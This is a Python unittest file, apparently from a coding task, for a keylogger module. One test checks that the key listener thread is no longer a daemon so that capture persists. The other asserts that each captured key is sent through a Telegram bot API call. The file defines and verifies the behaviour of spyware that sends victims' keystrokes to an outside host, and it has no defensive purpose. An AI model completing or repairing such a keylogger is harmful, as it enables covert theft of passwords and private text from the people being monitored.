import unittest
from unittest.mock import patch, MagicMock

class TestKeylogger(unittest.TestCase):

    def test_bug_is_fixed(self):
        """
        This test checks that the bug has been fixed.
        The bug was that the listener thread was created as a daemon thread.
        """
        with open("keylogger.py", "r") as f:
            content = f.read()
        self.assertNotIn("listener_thread.daemon = True", content, "The bug (daemon thread) should be fixed.")

    def test_send_key_to_telegram(self):
        """
        This test checks the send_key_to_telegram function.
        We mock pynput and requests to avoid the ImportError.
        """
        # Mock the entire pynput module
        pynput_mock = MagicMock()
        pynput_mock.keyboard = MagicMock()

        with patch.dict('sys.modules', {'pynput': pynput_mock, 'pynput.keyboard': pynput_mock.keyboard, 'requests': MagicMock()}):
            import importlib
            import keylogger
            importlib.reload(keylogger)

            keylogger.requests.post = MagicMock()
            keylogger.send_key_to_telegram("a")
            keylogger.requests.post.assert_called_once()
            args, kwargs = keylogger.requests.post.call_args
            self.assertTrue(args[0].startswith("https://api.telegram.org/bot"))
            self.assertEqual(kwargs['data']['text'], "a")

if __name__ == '__main__':
    unittest.main()
